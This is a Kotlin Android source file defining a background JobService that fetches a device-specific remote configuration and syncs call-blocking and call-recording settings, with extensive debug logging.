package com.hawkshaw.library.services

import android.app.job.JobParameters
import android.app.job.JobService
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.handler.syncCallBlocking
import com.hawkshaw.library.handler.syncCallRecording
import com.hawkshaw.library.handler.syncDynamicConfig
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import android.util.Log // Added for logging
import com.hawkshaw.library.preferences.Prefs

/**
 * Service for handling periodic sync operations
 */
class SyncService : JobService() {
    private val TAG = "SyncService"
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onStartJob(params: JobParameters?): Boolean {
        val jobId = params?.jobId
        Log.d(TAG, "[DEBUG] onStartJob called. JobId: $jobId, Params: $params")
        // Existing Logger.d call
        Logger.d(TAG, "Starting sync job", false, 4, null)

        Log.d(TAG, "[DEBUG] onStartJob: Launching serviceScope coroutine.")
        serviceScope.launch {
            Log.d(TAG, "[DEBUG] onStartJob: Coroutine started on thread: ${Thread.currentThread().name}")
            try {
                // Sync app configuration
                Log.d(TAG, "[DEBUG] onStartJob: Calling Injector.INSTANCE.appConfig.getDynamicConfig()")
                val deviceId = Prefs.getString("device_id", "")
                val response = Injector.INSTANCE.appConfig.getDynamicConfig(deviceId) 
                Log.d(TAG, "[DEBUG] onStartJob: getDynamicConfig response: $response, State: ${response.state}")
                // Existing Logger.d call
                Logger.d(TAG, "Sync app config response: ${response.state}", false, 4, null)

                // Sync call blocking
                Log.d(TAG, "[DEBUG] onStartJob: Calling syncCallBlocking()")
                syncCallBlocking()
                Log.d(TAG, "[DEBUG] onStartJob: syncCallBlocking() completed.")

                // Sync call recording
                Log.d(TAG, "[DEBUG] onStartJob: Calling syncCallRecording()")
                syncCallRecording()
                Log.d(TAG, "[DEBUG] onStartJob: syncCallRecording() completed.")

                // Sync dynamic config
                Log.d(TAG, "[DEBUG] onStartJob: Calling syncDynamicConfig()")
                syncDynamicConfig()
                Log.d(TAG, "[DEBUG] onStartJob: syncDynamicConfig() completed.")

                // Existing Logger.d call
                Logger.d(TAG, "Sync job completed successfully", false, 4, null)
                Log.d(TAG, "[DEBUG] onStartJob: Sync job completed successfully within coroutine.")
            } catch (e: Exception) {
                Log.e(TAG, "[DEBUG] onStartJob: Error during sync job: ${e.message}", e)
                // Existing Logger.e call
                Logger.e(TAG, "Error during sync job", e, false, 12, null)
            } finally {
                Log.d(TAG, "[DEBUG] onStartJob: Coroutine finally block. Calling jobFinished. JobId: $jobId, NeedsReschedule: false")
                jobFinished(params, false) // false: job doesn't need to be rescheduled
                Log.d(TAG, "[DEBUG] onStartJob: jobFinished called.")
            }
        }
        Log.d(TAG, "[DEBUG] onStartJob: Returning true (job is ongoing).")
        return true // true: a new thread was started for the job
    }

    override fun onStopJob(params: JobParameters?): Boolean {
        val jobId = params?.jobId
        Log.d(TAG, "[DEBUG] onStopJob called. JobId: $jobId, Params: $params")
        // Existing Logger.d call
        Logger.d(TAG, "Sync job stopped", false, 4, null)
        // Return false to drop the job.
        // Return true if you want the job to be rescheduled.
        Log.d(TAG, "[DEBUG] onStopJob: Returning false (job should not be rescheduled).")
        return false
    }
}
